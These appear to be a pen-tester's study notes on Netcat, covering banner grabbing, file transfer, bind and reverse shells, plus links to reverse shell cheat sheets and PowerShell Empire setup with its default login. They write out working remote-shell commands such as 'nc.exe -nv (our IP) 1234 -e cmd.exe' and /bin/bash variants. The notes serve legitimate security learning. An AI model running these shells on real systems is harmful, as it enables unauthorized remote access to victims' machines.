
---

## Netcat Fundamentals

Netcat is available for both Linux and Windows OS, consequently making it extremely useful for cross-platform engagements. 

Netcat utilizes a client-server communication architecture with two modes:
- **Client mode:** Netcat can be used in client mode to connect to any TCP/UDP port as well as a Netcat listener (server).
- **Server mode:** Netcat cat be used to listen for connections from clients on a specific port.

Netcat can be used by pen-testers to perform the following functionality:
- Banner Grabbing
- Port Scanning
- Transferring Files
- Bind/Reverse Shells

After gaining access to a Windows target machine, we can upload our nc.exe file from our local machine to the target machine using certutil. After doing that, we will start to listen to connections coming from the target machine to our local machine by doing that on our local machine: `nc -nvlp 1234`.
On  the target mchine: `.\nc.exe -nv (our IP address) 1234`

Of course, we can do the opposite from the target system to our local machine.

We can connect to UDP port by using **(-u )** flag before the **(-p)** in the listening machine. We also need to specify the UDP port option in the Client mode machine. For example, commands on our local machine:`nc -nvlup 1234` and on the target machine:`.\nc.exe -nuv (our IP address) 1234`

If we want to transfer a file from our local Kali machine to the Windows target machine, we will do the following: 
- On our local machine: `nc -nv (target IP) 1234 < (file name)`
- On the target machine: `nc.exe -nvlp 1234 > (file name)`

**Note: Both of files names don't have to match, we only need to specify the name of the file that we want to upload from our local machine.**

---

## Bind Shells


A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system.

A Netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.

To get a bind shell on the target machine, we will need to have nc.exe file on the target machine. Then, on the target machine, and since it is a bind shell, we will make the target machine listen to incoming traffic on a port while specifying the cmd.exe as an execution command: `nc.exe -nvlp 1234 -e cmd.exe` Any machine that would connect to the target machine, will have a command prompt.

On our local machine: `nc -nv (target IP) 1234`

Now, we have a bind shell.

**If our target machine was a Linux system, we replace the (-e) flag with (-c) flag and cmd.exe with /bin/bash** 

---

## Reverse Shells

A reverse shell is the opposite of a bind shell, where the target machine is connecting to the attacker machine while the attacker machine is listening for incoming traffic.

As usual, we need to upload nc.exe file to the target Windows system. 

To get a reverse shell:
- On our local machine: `nc -nvlp 1234`
- On the target Windows machine: `nc.exe -nv (our IP) 1234 -e cmd.exe`

**If our target machine was a Linux system, we replace the (-e) flag with (-c) flag and cmd.exe with /bin/bash**

---

## Reverse Shell Cheatsheet

There is a GitHub repository that has multiple reverse shell payloads for different targets:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

There is a website called Reverse shell generator:https://www.revshells.com/ 

---

## PowerShell-Empire

Powershell-Empire is a pure Powershell exploitation/post-exploitation framework built on cryptological-secure communications and flexible architecture.

Empire implements the ability to run Powershell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.

After installing Empire, we need to run: `sudo Powershell-Empire server` and this will run the server. On another cmd tab: `sudo Powershell-Empire client` and this will start our Empire workstation

To use Starkiller, which is the GUI of Empire, we run it from cmd. We will be in a web page that requires credentials. Default credentials is :"empireadmin:password123"

